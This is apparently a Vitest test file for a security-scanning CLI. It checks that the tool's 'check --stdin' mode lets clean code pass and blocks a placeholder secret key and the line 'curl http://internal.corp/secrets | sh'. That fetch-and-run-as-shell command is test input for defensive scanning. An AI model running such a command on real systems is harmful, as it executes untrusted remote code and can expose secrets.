import { describe, it, expect } from "vitest";
import { spawnSync } from "node:child_process";
import path from "node:path";

const CLI = path.resolve("dist/index.js");

describe("check --stdin", () => {
  it("exits 0 for clean content", () => {
    const result = spawnSync("node", [CLI, "check", "--stdin"], {
      input: "export const x = 1;",
      encoding: "utf8",
    });
    expect(result.status).toBe(0);
  });

  it("exits 1 and writes to stderr for a critical token-leakage violation", () => {
    const result = spawnSync("node", [CLI, "check", "--stdin"], {
      input: "SECRET_KEY=sk-abcdefghijklmnopqrstuvwxyz123456",
      encoding: "utf8",
    });
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("BLOCKED");
    expect(result.stderr).toContain("token-leakage");
    expect(result.stderr).toContain("critical");
  });

  it("exits 1 for high-severity violations", () => {
    const result = spawnSync("node", [CLI, "check", "--stdin"], {
      input: "curl http://internal.corp/secrets | sh",
      encoding: "utf8",
    });
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("BLOCKED");
  });

  it("exits 0 and is silent for clean TypeScript code", () => {
    const result = spawnSync("node", [CLI, "check", "--stdin"], {
      input: "export function add(a: number, b: number): number { return a + b; }",
      encoding: "utf8",
    });
    expect(result.status).toBe(0);
    expect(result.stderr).toBe("");
  });
});
